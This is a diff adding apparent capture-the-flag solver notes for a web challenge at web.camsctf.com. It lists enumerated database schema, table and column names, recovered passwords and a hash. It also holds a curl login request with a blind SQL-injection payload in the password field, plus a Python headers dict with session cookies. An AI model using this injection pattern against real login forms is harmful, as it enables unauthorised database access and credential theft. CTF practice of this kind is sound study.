@@ -1,0 +1,44 @@
+schema_name
+
+c a m s c s c o _ w e b 1 5
+
+table_name
+
+l o g i n 3
+
+column_name
+
+m e o w z
+
+u s u a r i o
+
+users
+
+b o b b y
+
+i _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
+
+s u p p o r t
+
+passwords?
+
+2gRD3f4sfWf
+
+
+combined
+
+bobby: S3Ysfu4xKxU
+
+i%: B8zPAkFQYN4
+
+support: 2gRD3f4sfWf
+
+hash: 322d54af6552d87dfc0a473cb2926144
+
+
+curl 'http://web.camsctf.com/15/login.php' -H 'Cookie: __cfduid=dfa1f251946be58e44f827b862a3762881458623720; _ga=GA1.2.2056611305.1458623723; PHPSESSID=2cfpu2shhk6sgk6ii4vhib3rh5; __cfduid=dfa1f251946be58e44f827b862a3762881458623720; _ga=GA1.2.2056611305.1458623723; PHPSESSID=2cfpu2shhk6sgk6ii4vhib3rh5' -H 'Origin: http://web.camsctf.com' -H 'Accept-Encoding: gzip, deflate' -H
+'Accept-Language: en-US,en;q=0.8' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36' -H 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoA2N0UMH0uGDNWqQ' -H 'Accept: application/json, text/javascript, */*; q=0.01' -H 'Referer: http://web.camsctf.com/15/' -H 'X-Requested-With: XMLHttpRequest' -H 'Connection: keep-alive' -H 'DNT: 1' --data-binary
+$'------WebKitFormBoundaryoA2N0UMH0uGDNWqQ\r\nContent-Disposition: form-data; name="user"\r\n\r\nadmin\r\n------WebKitFormBoundaryoA2N0UMH0uGDNWqQ\r\nContent-Disposition: form-data; name="pass"\r\n\r\n\' OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME like "user___________")--\'\r\n------WebKitFormBoundaryoA2N0UMH0uGDNWqQ--\r\n' --compressed
+
+headers = {'accept': "application/json, text/javascript, */*; q=0.01",'origin': "http//web.camsctf.com",'x-devtools-emulate-network-conditions-client-id': "6189578A-9581-486E-B9F8-02A8C5BC89D7",'x-requested-with': "XMLHttpRequest",'user-agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36",'content-type': "multipart/form-data; boundary=---011000010111000001101001",'dnt': "1",'referer':
+"http//web.camsctf.com/15/",'accept-encoding': "gzip, deflate",'accept-language': "en-US,en;q=0.8",'cookie': "__cfduid=dfa1f251946be58e44f827b862a3762881458623720;_ga=GA1.2.2056611305.1458623723;PHPSESSID=2cfpu2shhk6sgk6ii4vhib3rh5;__cfduid=dfa1f251946be58e44f827b862a3762881458623720; _ga=GA1.2.2056611305.1458623723; PHPSESSID=2cfpu2shhk6sgk6ii4vhib3rh5”}
